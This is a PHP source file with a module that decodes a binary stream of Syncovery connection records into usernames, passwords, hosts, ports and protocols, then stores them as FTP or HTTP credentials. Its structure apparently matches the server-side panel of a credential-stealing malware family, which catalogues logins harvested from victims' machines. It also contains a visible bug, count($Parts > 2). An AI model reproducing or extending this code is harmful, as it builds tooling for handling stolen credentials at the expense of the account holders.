<?php
	class Module_syncovery extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$stream = new Stream($Data);
					while(TRUE)
					{
						$Type	= $stream->getSTRING_();
						if($Type == NULL)
							break;

						$Pass 	= $stream->getSTRING_();
						$Host	= $stream->getSTRING_();

						$Parts = parse_url($Type.$Pass."@".$Host);
						if(count($Parts > 2))
						{
							$User = Assign_($Parts['user']);
							$Pass = Assign_($Parts['pass']);
							$Host = Assign_($Parts['host']);
							$Port = Assign_($Parts['port']);
							$Prot = Assign_($Parts['scheme']);
							
							if ($Prot == 'ftp' || $Prot == 'sftp' || $Prot == 'ftps' )
								$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 'sftp'), $Port), $User, $Pass);
							else if ($Prot == 'http' || $Prot == 'https')
								$this->add_http($Prot."://".$Host, $User, $Pass);
							else
								$this->add_http($Host, $User, $Pass);
						}
					}
					$stream = NULL;
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}